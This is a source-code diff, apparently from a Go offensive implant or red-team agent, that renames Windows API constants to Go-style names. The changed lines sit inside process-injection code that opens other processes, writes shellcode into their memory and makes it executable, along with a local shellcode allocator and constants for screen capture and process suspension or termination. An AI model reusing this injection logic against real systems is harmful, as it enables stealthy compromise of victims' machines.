@@ -80,38 +80,36 @@ var (
 
 // Constants
 const (
-	SM_XVIRTUALSCREEN  = 76
-	SM_YVIRTUALSCREEN  = 77
-	SM_CXVIRTUALSCREEN = 78
-	SM_CYVIRTUALSCREEN = 79
-	SM_CXSCREEN        = 0
-	SM_CYSCREEN        = 1
+	smXVirtualScreen  = 76
+	smYVirtualScreen  = 77
+	smCxVirtualScreen = 78
+	smCyVirtualScreen = 79
+	smCxScreen        = 0
+	smCyScreen        = 1
 
-	SRCCOPY        = 0x00CC0020
-	CAPTUREBLT     = 0x40000000
-	BI_RGB         = 0
-	DIB_RGB_COLORS = 0
-	LOGPIXELSX     = 88
+	SRCCOPY      = 0x00CC0020
+	CAPTUREBLT   = 0x40000000
+	biRGB        = 0
+	dibRGBColors = 0
+	LOGPIXELSX   = 88
 
-	TH32CS_SNAPPROCESS        = 0x00000002
-	TH32CS_SNAPTHREAD         = 0x00000004
-	THREAD_SUSPEND_RESUME     = 0x0002
-	PROCESS_TERMINATE         = 0x0001
-	PROCESS_QUERY_INFORMATION = 0x0400
-	MAX_PATH                  = 260
-	CF_TEXT                   = 1
-	GMEM_MOVEABLE             = 0x0002
+	th32csSnapProcess       = 0x00000002
+	th32csSnapThread        = 0x00000004
+	threadSuspendResume     = 0x0002
+	processTerminate        = 0x0001
+	processQueryInformation = 0x0400
+	maxPath                 = 260
+	cfText                  = 1
+	gmemMoveable            = 0x0002
 
-	PROCESS_CREATE_THREAD  = 0x0002
-	PROCESS_VM_OPERATION   = 0x0008
-	PROCESS_VM_WRITE       = 0x0020
-	PROCESS_VM_READ        = 0x0010
-	PROCESS_ALL_ACCESS     = 0x1F0FFF
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_READWRITE         = 0x04
-	PAGE_EXECUTE_READ      = 0x20
-	PAGE_EXECUTE_READWRITE = 0x40
+	processCreateThread = 0x0002
+	processVMOperation  = 0x0008
+	processVMWrite      = 0x0020
+	processVMRead       = 0x0010
+	processAllAccess    = 0x1F0FFF
+	// Memory-allocation protection/state constants (0x04/0x20/0x40/0x1000/
+	// 0x2000) are defined once in peloader.go: pageReadwrite,
+	// pageExecuteRead, pageExecuteReadwrite, memCommit, memReserve.
 )
 
 // Structs
@@ -125,7 +123,7 @@ type processEntry32 struct {
 	th32ParentProcessID uint32
 	pcPriClassBase      int32
 	dwFlags             uint32
-	szExeFile           [MAX_PATH]uint16
+	szExeFile           [maxPath]uint16
 }
 
 type threadEntry32 struct {
@@ -190,8 +188,8 @@ func allocateRX(hProcess uintptr, data []byte) (uintptr, error) {
 	addr, _, _ := procVirtualAllocEx.Call(
 		hProcess, 0,
 		uintptr(len(data)),
-		uintptr(MEM_COMMIT|MEM_RESERVE),
-		uintptr(PAGE_READWRITE),
+		uintptr(memCommit|memReserve),
+		uintptr(pageReadwrite),
 	)
 	if addr == 0 {
 		return 0, fmt.Errorf("VirtualAllocEx RW failed")
@@ -213,7 +211,7 @@ func allocateRX(hProcess uintptr, data []byte) (uintptr, error) {
 	ret, _, _ = procVirtualProtectEx.Call(
 		hProcess, addr,
 		uintptr(len(data)),
-		uintptr(PAGE_EXECUTE_READ),
+		uintptr(pageExecuteRead),
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if ret == 0 {
@@ -228,8 +226,8 @@ func allocateLocalRX(data []byte) (uintptr, error) {
 	addr, _, _ := procVirtualAlloc.Call(
 		0,
 		uintptr(len(data)),
-		uintptr(MEM_COMMIT|MEM_RESERVE),
-		uintptr(PAGE_READWRITE),
+		uintptr(memCommit|memReserve),
+		uintptr(pageReadwrite),
 	)
 	if addr == 0 {
 		return 0, fmt.Errorf("VirtualAlloc RW failed")
@@ -241,7 +239,7 @@ func allocateLocalRX(data []byte) (uintptr, error) {
 	ret, _, _ := procVirtualProtect.Call(
 		addr,
 		uintptr(len(data)),
-		uintptr(PAGE_EXECUTE_READ),
+		uintptr(pageExecuteRead),
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if ret == 0 {
@@ -298,10 +296,10 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 		}
 	}
 
-	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
+	da := uint32(processCreateThread | processVMOperation | processVMWrite | processVMRead | processQueryInformation)
 	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
 	if hProc == 0 {
-		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
+		hProc, _, _ = procOpenProcess.Call(uintptr(processAllAccess), 0, uintptr(pid))
 	}
 	if hProc == 0 {
 		return fmt.Errorf("OpenProcess failed for pid %d (check privs)", pid)
